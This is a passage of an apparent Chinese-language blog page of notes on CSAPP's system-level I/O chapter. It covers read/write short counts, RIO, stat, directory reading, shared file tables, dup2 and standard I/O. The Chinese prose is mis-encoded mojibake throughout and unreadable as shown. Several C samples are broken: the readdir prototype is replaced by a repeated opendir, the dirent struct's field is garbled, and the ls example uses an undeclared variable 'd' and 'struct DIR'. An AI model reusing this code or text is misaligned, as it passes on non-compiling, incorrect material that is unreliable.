åˆ™ä¸º0ï¼Œè‹¥å‡ºé”™ä¸º -1ã€‚</span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> n)</span>;<br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºå†™çš„å­—èŠ‚æ•°ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><blockquote><p><code>size_t</code> å’Œ <code>ssize_t</code> ç±»å‹çš„æœ€å¤§åŒºåˆ«å°±æ˜¯ <code>ssize_t</code> æœ‰ç¬¦å·ã€‚</p></blockquote><p>read å‡½æ•°ä»æè¿°ç¬¦ä¸º fd çš„å½“å‰æ–‡ä»¶ä½ç½®å¤åˆ¶æœ€å¤š n ä¸ªå­—èŠ‚åˆ°å†…å­˜ä½ç½® buf ã€‚write å‡½æ•°ä»å†…å­˜ä½ç½® buf å¤åˆ¶è‡³å¤šn ä¸ªå­—èŠ‚åˆ°æè¿°ç¬¦ fd çš„å½“å‰æ–‡ä»¶ä½ç½®ã€‚</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œread å’Œ write ä¼ é€çš„å­—èŠ‚æ¯”åº”ç”¨ç¨‹åºè¦æ±‚çš„è¦å°‘ã€‚å°±ä¼šè¿”å›ä¸è¶³å€¼ï¼Œ<strong>ä¸è¶³å€¼ï¼ˆshort countï¼‰å¹¶ä¸è¡¨ç¤ºæœ‰é”™è¯¯</strong>ã€‚å‡ºç°è¿™æ ·æƒ…å†µçš„åŸå› æœ‰ï¼š</p><ul><li><strong>è¯»æ—¶é‡åˆ° EOFã€‚</strong>å‡è®¾æˆ‘ä»¬å‡†å¤‡è¯»ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä»å½“å‰æ–‡ä»¶ä½ç½®å¼€å§‹åªå«æœ‰ 20 å¤šä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬ä»¥ 50 ä¸ªå­—èŠ‚çš„ç‰‡è¿›è¡Œè¯»å–ã€‚è¿™æ ·ä¸€æ¥ï¼Œä¸‹ä¸€ä¸ª read è¿”å›çš„ä¸è¶³å€¼ä¸º 20ï¼Œæ­¤åçš„ read å°†é€šè¿‡è¿”å›ä¸è¶³å€¼ 0 æ¥å‘å‡º EOF ä¿¡å·ã€‚</li><li><strong>ä»ç»ˆç«¯è¯»æ–‡æœ¬è¡Œã€‚</strong>å¦‚æœæ‰“å¼€æ–‡ä»¶æ˜¯ä¸ç»ˆç«¯ç›¸å…³è”çš„ï¼ˆå¦‚é”®ç›˜å’Œæ˜¾ç¤ºå™¨ï¼‰ï¼Œé‚£ä¹ˆæ¯ä¸ª read å‡½æ•°å°†ä¸€æ¬¡ä¼ é€ä¸€ä¸ªæ–‡æœ¬è¡Œï¼Œè¿”å›çš„ä¸è¶³å€¼ç­‰äºæ–‡æœ¬è¡Œçš„å¤§å°ã€‚</li><li><strong>è¯»å’Œå†™ç½‘ç»œå¥—æ¥å­—</strong>ã€‚å¦‚æœæ‰“å¼€çš„æ–‡ä»¶å¯¹åº”äºç½‘ç»œå¥—æ¥å­—ï¼Œé‚£ä¹ˆå†…éƒ¨ç¼“å†²çº¦æŸå’Œè¾ƒé•¿çš„ç½‘ç»œå»¶è¿Ÿä¼šå¼•èµ· read å’Œ write è¿”å›ä¸å€¼ã€‚å¯¹ Linux ç®¡é“ï¼ˆpipeï¼‰è°ƒç”¨ readå’Œ write æ—¶ï¼Œä¹Ÿæœ‰å¯èƒ½å‡ºç°ä¸è¶³å€¼ã€‚</li></ul><h1 id="ç”¨-RIO-åŒ…å¥å£®åœ°è¯»å†™"><a href="#ç”¨-RIO-åŒ…å¥å£®åœ°è¯»å†™" class="headerlink" title="ç”¨ RIO åŒ…å¥å£®åœ°è¯»å†™"></a>ç”¨ RIO åŒ…å¥å£®åœ°è¯»å†™</h1><p>RIOï¼ˆRobust I&#x2F;Oï¼‰å°±æ˜¯ä¸€ä¸ª I&#x2F;O åŒ…ï¼Œå®ƒä¼šè‡ªåŠ¨å¤„ç†ä¸Šæ–‡ä¸­æåˆ°çš„ä¸è¶³å€¼ã€‚RIO æä¾›äº†ä¸¤ç±»ä¸åŒçš„å‡½æ•°ï¼š</p><ul><li><strong>æ— ç¼“å†²çš„è¾“å…¥è¾“å‡ºå‡½æ•°</strong>ã€‚è¿™äº›å‡½æ•°ç›´æ¥åœ¨å†…å­˜å’Œæ–‡ä»¶ä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œæ²¡æœ‰åº”ç”¨çº§çš„ç¼“å†²ã€‚å®ƒä»¬å¯¹å°†äºŒè¿›åˆ¶æ•°æ®è¯»å†™åˆ°ç½‘ç»œå’Œä»ç½‘ç»œè¯»å†™äºŒè¿›åˆ¶æ•°æ®å°¤å…¶æœ‰ç”¨ã€‚</li><li><strong>å¸¦ç¼“å†²çš„è¾“å…¥å‡½æ•°</strong>ã€‚è¿™äº›å‡½æ•°å…è®¸æˆ‘ä»¬é«˜æ•ˆåœ°ä»æ–‡ä»¶ä¸­è¯»å–æ–‡æœ¬è¡Œå’ŒäºŒè¿›åˆ¶æ•°æ®ï¼Œè¿™äº›æ–‡ä»¶çš„å†…å®¹ç¼“å­˜åœ¨åº”ç”¨çº§ç¼“å†²åŒºå†…ï¼Œç±»ä¼¼äºä¸º printf è¿™æ ·çš„æ ‡å‡† I&#x2F;O å‡½æ•°æä¾›çš„ç¼“å†²åŒºã€‚</li></ul><blockquote><p>å¸¦ç¼“å†²çš„ RIO è¾“äººå‡½æ•°æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå®ƒåœ¨åŒä¸€ä¸ªæè¿°ç¬¦ä¸Šå¯ä»¥è¢«äº¤é”™åœ°è°ƒç”¨</p></blockquote><h1 id="è¯»å–æ–‡ä»¶å…ƒæ•°æ®"><a href="#è¯»å–æ–‡ä»¶å…ƒæ•°æ®" class="headerlink" title="è¯»å–æ–‡ä»¶å…ƒæ•°æ®"></a>è¯»å–æ–‡ä»¶å…ƒæ•°æ®</h1><p>åº”ç”¨ç¨‹åºèƒ½å¤Ÿé€šè¿‡è°ƒç”¨ stat å’Œ fstat å‡½æ•°ï¼Œæ£€ç´¢åˆ°å…³äºæ–‡ä»¶çš„ä¿¡æ¯ï¼ˆæœ‰æ—¶ä¹Ÿç§°ä¸ºæ–‡ä»¶çš„<strong>å…ƒæ•°æ®</strong>ï¼ˆmetadataï¼‰ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">stat</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-keyword">struct</span> stat *buf)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fstat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> stat *buf)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸º 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p>stat å‡½æ•°ä»¥æ–‡ä»¶åä½œä¸ºè¾“å…¥ï¼Œå¹¶å¡«å†™ stat æ•°æ®ç»“æ„ä¸­çš„å„ä¸ªæˆå‘˜ã€‚fstat ä»¥æ–‡ä»¶æè¿°ç¬¦ä½œä¸ºè¾“å…¥ã€‚</p><p>ä¸‹é¢æ˜¯ stat ç»“æ„ä½“çš„è¯¦ç»†ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Metadata returned by the stat and fstat functions */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> &#123;</span><br>    <span class="hljs-type">dev_t</span>         st_dev;      <span class="hljs-comment">/* Device */</span><br>    <span class="hljs-type">ino_t</span>         st_ino;      <span class="hljs-comment">/* inode */</span><br>    <span class="hljs-type">mode_t</span>        st_mode;     <span class="hljs-comment">/* Protection and file type */</span><br>    <span class="hljs-type">nlink_t</span>       st_nlink;    <span class="hljs-comment">/* Number of hard links */</span><br>    <span class="hljs-type">uid_t</span>         st_uid;      <span class="hljs-comment">/* User ID of owner */</span><br>    <span class="hljs-type">gid_t</span>         st_gid;      <span class="hljs-comment">/* Group ID of owner */</span><br>    <span class="hljs-type">dev_t</span>         st_rdev;     <span class="hljs-comment">/* Device type (if inode device) */</span><br>    <span class="hljs-type">off_t</span>         st_size;     <span class="hljs-comment">/* Total size, in bytes */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> st_blksize;  <span class="hljs-comment">/* Block size for filesystem I/O */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> st_blocks;   <span class="hljs-comment">/* Number of blocks allocated */</span><br>    <span class="hljs-type">time_t</span>        st_atime;    <span class="hljs-comment">/* Time of last access */</span><br>    <span class="hljs-type">time_t</span>        st_mtime;    <span class="hljs-comment">/* Time of last modification */</span><br>    <span class="hljs-type">time_t</span>        st_ctime;    <span class="hljs-comment">/* Time of last change */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>stat ç»“æ„ä½“å®šä¹‰åœ¨ <code>sys/stat.h</code> å¤´æ–‡ä»¶ä¸­ã€‚</p><p>st_size æˆå‘˜åŒ…å«äº†æ–‡ä»¶çš„å­—èŠ‚æ•°å¤§å°ã€‚st_mode æˆå‘˜åˆ™ç¼–ç äº†æ–‡ä»¶è®¿é—®è®¸å¯ä½å’Œæ–‡ä»¶ç±»å‹ã€‚</p><p>Linux åœ¨ sys&#x2F;stat.h ä¸­å®šä¹‰äº†å®è°“è¯æ¥ç¡®å®š st_mode æˆå‘˜çš„æ–‡ä»¶ç±»å‹ï¼š</p><ul><li>**S_ISREG(m)**ã€‚è¿™æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶å—ï¼Ÿ</li><li>**S_ISDIR(m)**ã€‚è¿™æ˜¯ä¸€ä¸ªç›®å½•æ–‡ä»¶å—ï¼Ÿ</li><li>**S_ISSOCK(m)**ã€‚è¿™æ˜¯ä¸€ä¸ªç½‘ç»œå¥—æ¥å­—å—ï¼Ÿ</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å– st_mode æˆå‘˜æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">s</span>;</span><br>    <span class="hljs-type">char</span> *type, *readok;<br>    stat(argv[<span class="hljs-number">1</span>], &amp;s);<br>    <span class="hljs-keyword">if</span> (S_ISREG(s.st_mode))     <span class="hljs-comment">/* Determine file type */</span><br>        type = <span class="hljs-string">&quot;regular&quot;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(s.st_mode))<br>        type = <span class="hljs-string">&quot;directory&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        type = <span class="hljs-string">&quot;other&quot;</span>;<br>    <span class="hljs-keyword">if</span> ((s.st_mode &amp; S_IRUSR))  <span class="hljs-comment">/* Check read access */</span><br>        readok = <span class="hljs-string">&quot;yes&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        readok = <span class="hljs-string">&quot;no&quot;</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;type: %s, read: %s\n&quot;</span>, type, readok);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="è¯»å–ç›®å½•å†…å®¹"><a href="#è¯»å–ç›®å½•å†…å®¹" class="headerlink" title="è¯»å–ç›®å½•å†…å®¹"></a>è¯»å–ç›®å½•å†…å®¹</h1><p>æ‰“å¼€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><br>DIR *<span class="hljs-title function_">opendir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸï¼Œåˆ™ä¸ºå¤„ç†çš„æŒ‡é’ˆï¼›è‹¥å‡ºé”™ï¼Œåˆ™ä¸º NULLã€‚</span><br></code></pre></td></tr></table></figure><p>è¯»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><br>DIR *<span class="hljs-title function_">opendir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºå¤„ç†çš„æŒ‡é’ˆï¼Œè‹¥å‡ºé”™åˆ™ä¸º NULLã€‚</span><br></code></pre></td></tr></table></figure><p>æ¯æ¬¡å¯¹ readdir çš„è°ƒç”¨è¿”å›çš„éƒ½æ˜¯æŒ‡å‘æµ dirp ä¸­ä¸‹ä¸€ä¸ªç›®å½•é¡¹çš„æŒ‡é’ˆï¼›æˆ–è€…ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šç›®å½•é¡¹åˆ™è¿”å› NULLã€‚æ¯ä¸ªç›®å½•é¡¹éƒ½æ˜¯ä¸€ä¸ªç»“æ„ï¼Œå…¶å½¢å¼å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> &#123;</span><br>    <span class="hljs-type">ino_t</span> d_ino;<span class="hljs-comment">/* inode number */</span><br>    d_name[<span class="hljs-number">256</span>]; <span class="hljs-comment">/* Filename */</span><span class="hljs-type">char</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å…³é—­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">closedir</span><span class="hljs-params">(DIR *dirp)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šæˆåŠŸä¸º 0ï¼›é”™è¯¯ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨ä¸Šé¢çš„ä¸‰ä¸ªå‡½æ•°å†™ä¸€ä¸ªç±»ä¼¼äº Linux ç³»ç»Ÿçš„ ls å‘½ä»¤çš„åŠŸèƒ½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DIR</span> *<span class="hljs-title">stream</span> =</span> opendir(<span class="hljs-string">&quot;/etc/&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> *<span class="hljs-title">dep</span>;</span><br><span class="hljs-keyword">while</span>((dep=readdir(d))!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,dep-&gt;d_name);<br>&#125;<br>    closedir(stream);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å…±äº«æ–‡ä»¶"><a href="#å…±äº«æ–‡ä»¶" class="headerlink" title="å…±äº«æ–‡ä»¶"></a>å…±äº«æ–‡ä»¶</h1><p>å†…æ ¸ç”¨ä¸‰ä¸ªç›¸å…³çš„æ•°æ®ç»“æ„æ¥è¡¨ç¤ºå®ƒæ‰“å¼€çš„æ–‡ä»¶ï¼š</p><ul><li><p><strong>æè¿°ç¬¦è¡¨</strong>ï¼šè¿›ç¨‹ä¹‹é—´ç‹¬ç«‹ï¼Œæ¯ä¸ªæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦è¡¨é¡¹æŒ‡å‘æ–‡ä»¶è¡¨ä¸­çš„ä¸€ä¸ªè¡¨é¡¹ã€‚</p></li><li><p><strong>æ–‡ä»¶è¡¨</strong>ï¼šæ‰€æœ‰è¿›ç¨‹ä¹‹é—´å…±äº«ã€‚æ¯ä¸ªè¡¨é¡¹çš„ç»„æˆåŒ…æ‹¬äº†æ–‡ä»¶ä½ç½®ã€å¼•ç”¨è®¡æ•°ã€ä»¥åŠæŒ‡å‘<strong>v-node è¡¨é¡¹</strong>å¯¹åº”çš„æŒ‡é’ˆã€‚æ¯å…³é—­ä¸€ä¸ªæè¿°ç¬¦ä¼šå‡å°‘ç›¸åº”çš„æ–‡ä»¶è¡¨é¡¹ä¸­çš„å¼•ç”¨è®¡æ•°ï¼Œå½“å¼•ç”¨è®¡æ•°ä¸º 0 ä¹Ÿå°±æ˜¯æ‰€æœ‰è¿›ç¨‹éƒ½å…³é—­äº†è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šåˆ é™¤è¿™ä¸ªè¡¨é¡¹ã€‚</p></li><li><p><strong>v-node è¡¨</strong>ï¼šæ‰€æœ‰è¿›ç¨‹å…±äº«ï¼Œé‡Œé¢çš„ä¸€ä¸ªè¡¨é¡¹åŒ…å«äº† stat ç»“æ„ä¿¡æ¯ä»¥åŠå…¶å®ƒä¸€äº›é¢å¤–çš„å­—æ®µã€‚</p></li></ul><p>ä¸‹å›¾æè¿°ç¬¦1å’Œ 4 é€šè¿‡ä¸åŒçš„æ‰“å¼€æ–‡ä»¶è¡¨é¡¹æ¥å¼•ç”¨ä¸åŒçš„æ–‡ä»¶ï¼Œä¾‹å¦‚è¿›ç¨‹ä¸­åˆ†åˆ«è°ƒç”¨ä¸€æ¬¡ open å‡½æ•°å’Œä¸€æ¬¡ write å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰“å¼€æ–‡ä»¶è¡¨ä¸­çš„å¼•ç”¨è®¡æ•°ä»…ä»…åœ¨ fork çš„æ—¶å€™ä¼šå¢åŠ ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84.png"></p><p>å¦‚æœä»¥åŒä¸€ä¸ªæ–‡ä»¶è°ƒç”¨ open å‡½æ•°ä¸¤æ¬¡ï¼Œå°±ä¼šå‘ç”Ÿä¸‹å›¾è¿™ç§æƒ…å†µã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6.png"></p><p>çˆ¶å­è¿›ç¨‹ä¹‹é—´ fork æ—¶å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6fork.png"></p><h1 id="I-x2F-O-é‡å®šå‘"><a href="#I-x2F-O-é‡å®šå‘" class="headerlink" title="I&#x2F;O é‡å®šå‘"></a>I&#x2F;O é‡å®šå‘</h1><p>Linuxshell æä¾›äº† I&#x2F;O é‡å®šå‘æ“ä½œç¬¦ï¼Œå…è®¸ç”¨æˆ·å°†ç£ç›˜æ–‡ä»¶å’Œæ ‡å‡†è¾“å…¥è¾“å‡ºè”ç³»èµ·æ¥ã€‚ä¾‹å¦‚ï¼Œé”®å…¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span> &gt; foo.txt</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥æŠŠ ls å‘½ä»¤çš„è¾“å‡ºå®šå‘åˆ°ç£ç›˜æ–‡ä»¶ foo.txt ä¸­ã€‚</p><p>I&#x2F;O é‡å®šå‘æ˜¯æ€ä¹ˆå·¥ä½œçš„å‘¢ï¼Ÿå…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ dup2 å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd, <span class="hljs-type">int</span> newfd)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºéè´Ÿçš„æè¿°ç¬¦ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p>dup2 å‡½æ•°å¤åˆ¶æè¿°ç¬¦è¡¨è¡¨é¡¹ <em>oldfd</em> åˆ°æè¿°ç¬¦è¡¨è¡¨é¡¹ <em>newfd</em>ï¼Œè¦†ç›–æè¿°ç¬¦è¡¨è¡¨é¡¹ <em>newfd</em> ä»¥å‰çš„å†…å®¹ã€‚å¦‚æœ <em>newfd</em> å·²ç»æ‰“å¼€äº†ï¼Œdup2 ä¼šåœ¨å¤åˆ¶ <em>oldfd</em> ä¹‹å‰å…³é—­ <em>newfd</em>ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è°ƒç”¨ <code>dup2(4,1)</code>ï¼Œè°ƒç”¨ä¹‹å‰ï¼ŒçŠ¶æ€å¦‚å…±äº«æ–‡ä»¶ä¸­çš„å›¾ä¸€ä¸€æ ·ï¼Œæ ‡å‡†æè¿°ç¬¦ 1 å¯¹åº”ä¸æ–‡ä»¶ Aï¼Œæè¿°ç¬¦ 4 å¯¹åº”äºæ–‡ä»¶ Bã€‚æ­¤æ—¶ A å’Œ B çš„å¼•ç”¨è®¡æ•°éƒ½ç­‰äº1ã€‚</p><p>åœ¨è°ƒç”¨åï¼Œä¸¤ä¸ªæè¿°ç¬¦éƒ½æŒ‡å‘æ–‡ä»¶ B ï¼Œæ–‡ä»¶ A è¢«å…³é—­ï¼Œå¹¶ä¸”å®ƒçš„æ–‡ä»¶è¡¨å’Œ v-node è¡¨è¡¨é¡¹ä¹Ÿå·²ç»è¢«åˆ é™¤äº†ã€‚æ–‡ä»¶ Bçš„å¼•ç”¨è®¡æ•°ä¹Ÿå·²ç»å¢åŠ ã€‚ä»æ­¤ä»¥åï¼Œä»»ä½•å†™åˆ°æ ‡å‡†è¾“å‡ºçš„æ•°æ®éƒ½è¢«é‡å®šå‘åˆ°æ–‡ä»¶ Bã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%81%E7%A8%8B.png"></p><h1 id="æ ‡å‡†-I-x2F-O"><a href="#æ ‡å‡†-I-x2F-O" class="headerlink" title="æ ‡å‡† I&#x2F;O"></a>æ ‡å‡† I&#x2F;O</h1><p>C è¯­è¨€å®šä¹‰äº†ä¸€ç»„é«˜çº§è¾“äººè¾“å‡ºå‡½æ•°ï¼Œç§°ä¸ºæ ‡å‡† I&#x2F;O åº“ï¼Œä¸ºç¨‹åºå‘˜æä¾›äº† Unix I&#x2F;O çš„è¾ƒé«˜çº§åˆ«çš„æ›¿ä»£ã€‚</p><p>glibc æä¾›äº†æ‰“å¼€å’Œå…³é—­æ–‡ä»¶çš„å‡½æ•°ï¼ˆfopen å’Œ fcloseï¼‰ã€è¯»å’Œå†™å­—èŠ‚çš„å‡½æ•°ï¼ˆfread å’Œ fwriteï¼‰ã€è¯»å’Œå†™å­—ç¬¦ä¸²çš„å‡½æ•°ï¼ˆfgets å’Œ fputsï¼‰ï¼Œä»¥åŠå¤æ‚çš„æ ¼å¼åŒ–çš„ I&#x2F;O å‡½æ•°ï¼ˆscanf å’Œ printfï¼‰ã€‚</p><p>æ ‡å‡† I&#x2F;O åº“å°†ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æ¨¡å‹åŒ–ä¸ºä¸€ä¸ªæµã€‚å¯¹äºç¨‹åºå‘˜è€Œè¨€ï¼Œä¸€ä¸ªæµå°±æ˜¯ä¸€ä¸ªæŒ‡å‘ FILE ç±»å‹çš„ç»“æ„çš„æŒ‡é’ˆã€‚æ¯ä¸ª ANSI C ç¨‹åºå¼€å§‹æ—¶éƒ½æœ‰ä¸‰ä¸ªæ‰“å¼€çš„æµ stdinã€stdout å’Œ stderrï¼Œåˆ†åˆ«å¯¹åº”äºæ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯</p><figure class="highlight c"><table><tr><td 